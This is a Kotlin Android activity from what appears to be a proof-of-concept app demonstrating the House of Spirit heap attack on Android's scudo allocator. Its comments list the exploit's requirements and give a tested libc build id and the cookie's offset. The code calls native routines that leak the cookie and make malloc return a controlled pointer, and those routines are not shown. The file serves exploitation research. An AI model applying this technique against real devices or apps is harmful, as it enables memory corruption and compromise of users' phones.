package xyz.cygnusx.house_of_spirit

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.TextView
import xyz.cygnusx.house_of_spirit.databinding.ActivityMainBinding

/*
    This is a demonstration of the House of Spirit attack on the android scudo allocator.
    Some info was sourced from https://lolcads.github.io/posts/2024/07/scudo_0/.
    The exploit is tested to work on libc build id: a87908b48b368e6282bcc9f34bcfc28c which
    comes bundled with Android 14 in Android Studio.

    This exploit causes malloc to return a controlled pointer

    Requirements:
    Free a semi-arbitrary value
    Leaked address to a controlled location
    Leaked scudo cookie (this can be done from a malicious app)
 */

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.sampleText.text = ""

        val cookie = leakCookie().toUInt()
        binding.sampleText.append("First we need to leak the scudo cookie. In this libc version it is found at libc base + 0xf7480.\n Cookie: 0x${cookie.toString(16)}\n")

        val fake = buildFakeChunk().toULong()
        val victim = getVictimAddr().toULong()
        binding.sampleText.append("If it worked, the following two addresses should be the same, and this proves malloc returns a controlled pointer.\n")
        binding.sampleText.append("fake chunk addr: 0x${fake.toString(16)}\n")
        binding.sampleText.append("victim chunk addr: 0x${victim.toString(16)}\n")


    }

    /**
     * A native method that is implemented by the 'house_of_spirit' native library,
     * which is packaged with this application.
     */
    external fun leakCookie(): Long
    external fun buildFakeChunk(): Long
    external fun getVictimAddr(): Long

    companion object {
        // Used to load the 'house_of_spirit' library on application startup.
        init {
            System.loadLibrary("house_of_spirit")
        }
    }
}